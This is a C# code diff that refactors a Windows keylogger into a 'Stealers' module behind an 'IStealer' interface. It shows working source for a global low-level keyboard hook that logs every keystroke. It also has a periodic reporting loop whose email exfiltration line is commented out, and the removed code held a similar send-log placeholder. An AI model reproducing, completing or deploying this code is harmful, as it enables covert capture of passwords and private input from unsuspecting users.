@@ -1,27 +1,23 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.Reflection;
-using System.IO;
-using System.Windows.Forms;
+using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
 
-namespace sub
+namespace sub.Stealers
 {
-    static class Keylogger
+    internal class Keylogger : IStealer
     {
         #region Declarations
+
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        private static string log;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
-            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+                                                      LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -29,20 +25,22 @@ namespace sub
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-            IntPtr wParam, IntPtr lParam);
+                                                    IntPtr wParam, IntPtr lParam);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
+
         #endregion
 
         #region Keyboard Hooks
+
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
             {
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                    GetModuleHandle(curModule.ModuleName), 0);
+                                        GetModuleHandle(curModule.ModuleName), 0);
             }
         }
 
@@ -52,45 +50,43 @@ namespace sub
         private static IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
             {
-                SaveOutput(Marshal.ReadInt32(lParam));
+                ProcessChar(Marshal.ReadInt32(lParam));
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+
         #endregion
 
-        public static void Run(object sendDelay)
+        private static string _data = "";
+
+        public void Collect()
         {
-            log = "";
-            new Thread(Keylogger.SendLog).Start(sendDelay);
             _hookID = SetHook(_proc);
-            Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
 
-        private static void SaveOutput(int code)
+        public void ReportData(object delay)
+        {
+            while (true)
+            {
+                Thread.Sleep((int) delay);
+                MessageBox.Show(_data);
+                //new ReportEmail(username, password).Send(_data);
+            }
+        }
+
+        private static void ProcessChar(int code)
         {
             switch (code)
             {
                 case 32:
-                    log += ' ';
+                    _data += "[Space]";
                     break;
                 default:
-                    log += (Keys)code;
+                    _data += (Keys) code;
                     break;
-            }
-        }
-
-        private static void SendLog(object sendDelay)
-        {
-            while (true)
-            {
-                Thread.Sleep(60000 * (int)sendDelay);
-
-                string logTemp = log;
-                log = "";
-                //email logTemp
             }
         }
     }
